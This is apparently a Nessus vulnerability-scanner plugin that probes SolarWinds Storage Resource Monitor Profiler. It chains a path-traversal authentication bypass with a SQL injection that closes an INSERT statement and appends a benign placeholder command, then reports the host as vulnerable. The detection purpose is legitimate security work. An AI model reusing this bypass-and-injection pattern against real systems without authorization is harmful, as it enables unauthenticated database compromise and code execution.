#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92559);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/07/28 13:53:41 $");

  script_osvdb_id(140424);
  script_bugtraq_id(91369);
  script_xref(name:"ZDI", value:"ZDI-16-374");

  script_name(english:"SolarWinds Storage Resource Monitor Profiler addNewRule SQL Injection RCE");
  script_summary(english:"Checks the response from the ScriptServlet servlet.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by a remote
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The SolarWinds Storage Resource Monitor (SRM) Profiler (formerly 
SolarWinds Storage Manager) running on the remote host is affected 
by a remote code execution vulnerability in ScriptServlet due to a 
failure to sanitize user-supplied input to the addNewRule() method 
of the RulesMetaData class. An unauthenticated, remote attacker can
exploit this, via SQL injection, to disclose or manipulate arbitrary
data in the back-end database or to execute arbitrary code in the
context of the database.

Note that the attacker, in order to exploit this vulnerability, would
need to exploit a path traversal vulnerability to invoke the
ScriptServlet servlet. This path traversal vulnerability was first
fixed in version 6.2.3.");
  # https://thwack.solarwinds.com/community/cloud-virtualization-storage_tht/storage-manager/blog/2016/06/10/srm-profiler-module-formerly-known-as-storage-manager-v623-hot-fix-1-is-available
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9d9e2515");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-16-374/");
  # http://www.solarwinds.com/documentation/storage/storagemanager/docs/ReleaseNotes/releaseNotes.htm
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?edc00ceb");
  script_set_attribute(attribute:"solution",value:
"Upgrade to SolarWinds SRM Profiler version 6.2.3 Hotfix 1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:storage_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:storage_resource_monitor");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("solarwinds_storagemanager_detect.nasl");
  script_require_keys("www/solarwinds_storage_manager");
  script_require_ports("Services/www", 9000);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

# Exit if app is not detected
kb_name = 'solarwinds_storage_manager';
get_install_count(app_name: kb_name, exit_if_zero:TRUE);

# Only probe http port(s) on which the app is running  
port = get_http_port(default:9000);
install = get_install_from_kb(appname:kb_name, port:port, exit_on_fail:TRUE);

dir = install['dir'];
url = build_url(qs:dir, port:port);
appname = "SolarWinds Resource Monitor Profiler";

injected_cmd  = "no such sql command";

# Causes an INSERT INTO table sys_rules, followed by our injected command.
# The 'hello' field will cause the INSERT to fail, otherwise the plugin is
# intrusive. 
ss = "Schedule', 0,'RuleNameAddedByNessus', '1', 'hello');" + injected_cmd + "; --";

postdata =
  'state=schedulerule' +
  "&ScriptSchedule=" + ss + 
  "&BpaScheduleName=NessusBpaScheduleName" + 
  '&BpaScheduleBuType=NessusBpaScheduleBuType' +
  '&parameter=NessusParameter';

# Exploit path traversal to bypass authentication
item = "/externalauthenticationservlet/%2e%2e/ScriptServlet";
res = http_send_recv3(port:port, method: 'POST',
        item: item, data: postdata,
        content_type: "application/x-www-form-urlencoded",
        exit_on_fail: TRUE 
      );
req = http_last_sent_request();
if( res[0] =~ "^HTTP/[0-9]\.[0-9] 200")
{
  if (ss >< res[2])
  {
    report = 
      '\n' + 'Nessus detected an SQL injection vulnerability on the remote ' + 
      '\n' + 'host using the following request :' +
      '\n' + 
      '\n' + 
      req; 
    security_report_v4(port:port, 
                      severity: SECURITY_HOLE, 
                      extra: report,
                      sqli: TRUE 
                      );
  }
  # The fix include:
  # 1) Fixed path traversal (auth bypass) in 6.2.3
  # 2) Use prepared statements with parameterized queries in 6.2.3 Hot Fix 1
  # So 6.2.3 is not vulnerable to the unauthenticated SQL injection
  else
  {
    audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);
  }
}
else
{
  audit(AUDIT_RESP_BAD, port, 'a POST message. Response status:\n' + res[0]);
}
